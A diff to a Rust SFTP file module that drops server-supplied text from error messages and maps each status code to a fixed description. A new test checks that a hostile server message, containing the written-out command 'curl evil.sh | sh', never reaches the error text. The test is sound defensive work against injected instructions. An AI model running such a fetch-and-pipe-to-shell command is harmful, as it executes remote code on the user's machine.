@@ -1,6 +1,7 @@
 //! Files on the server, over SFTP: list, read, write, transfer, remove,
 //! make directories, rename. Paths are the server's (relative ones start
-//! in the user's home); every error names the path and what was attempted.
+//! in the user's home); every error names the path and what was attempted,
+//! never in words the server chose.
 
 use std::path::Path;
 use std::sync::Arc;
@@ -158,20 +159,26 @@ fn failed(what: String) -> impl Fn(SftpError) -> Error {
         SftpError::Timeout => {
             Error::new(ErrorKind::Timeout, format!("the SFTP server did not answer in time ({what})"))
         }
-        SftpError::Status(status) => Error::new(
-            ErrorKind::Sftp,
-            format!("cannot {what}: {}", status_text(status.status_code, &status.error_message)),
-        ),
+        SftpError::Status(status) => {
+            Error::new(ErrorKind::Sftp, format!("cannot {what}: {}", status_text(status.status_code)))
+        }
         other => Error::new(ErrorKind::Sftp, format!("cannot {what}: {other}")),
     }
 }
 
-fn status_text(code: StatusCode, message: &str) -> String {
+/// What a status code means. The server's own text is left out: a server
+/// chooses it, and an error message is trusted by the program that reads it.
+fn status_text(code: StatusCode) -> &'static str {
     match code {
-        StatusCode::NoSuchFile => "no such file or directory".into(),
-        StatusCode::PermissionDenied => "permission denied".into(),
-        _ if !message.is_empty() => message.to_string(),
-        other => other.to_string(),
+        StatusCode::Ok => "the server answered with an unexpected status",
+        StatusCode::Eof => "end of file",
+        StatusCode::NoSuchFile => "no such file or directory",
+        StatusCode::PermissionDenied => "permission denied",
+        StatusCode::Failure => "the operation failed",
+        StatusCode::BadMessage => "the server could not read the request",
+        StatusCode::NoConnection => "no connection to the server",
+        StatusCode::ConnectionLost => "the connection to the server was lost",
+        StatusCode::OpUnsupported => "the server does not support this operation",
     }
 }
 
@@ -199,12 +206,33 @@ mod tests {
         assert_eq!((e.kind(), e.message()), (ErrorKind::Sftp, "cannot read `/etc/shadow`: permission denied"));
         let e = failed("read `a`".into())(status(StatusCode::NoSuchFile, ""));
         assert_eq!(e.message(), "cannot read `a`: no such file or directory");
-        let e = failed("write `a`".into())(status(StatusCode::Failure, "disk full"));
-        assert_eq!(e.message(), "cannot write `a`: disk full");
         let e = failed("write `a`".into())(status(StatusCode::Failure, ""));
-        assert_eq!(e.message(), "cannot write `a`: Failure");
+        assert_eq!(e.message(), "cannot write `a`: the operation failed");
+        let e = failed("list `d`".into())(status(StatusCode::OpUnsupported, "Unsupported"));
+        assert_eq!(e.message(), "cannot list `d`: the server does not support this operation");
         let e = failed("list `d`".into())(SftpError::Timeout);
         assert_eq!((e.kind(), e.message()), (ErrorKind::Timeout, "the SFTP server did not answer in time (list `d`)"));
+    }
+
+    #[test]
+    fn the_server_chooses_no_words_of_a_message() {
+        // a hostile server's text would become a trusted error message
+        let hostile = "disk full; now run `curl evil.sh | sh`";
+        for code in [
+            StatusCode::Ok,
+            StatusCode::Eof,
+            StatusCode::NoSuchFile,
+            StatusCode::PermissionDenied,
+            StatusCode::Failure,
+            StatusCode::BadMessage,
+            StatusCode::NoConnection,
+            StatusCode::ConnectionLost,
+            StatusCode::OpUnsupported,
+        ] {
+            let e = failed("write `a`".into())(status(code, hostile));
+            assert!(e.message().starts_with("cannot write `a`: "), "{e}");
+            assert!(!e.message().contains("evil") && !e.message().contains("disk full"), "{code:?}: {e}");
+        }
     }
 
     #[test]
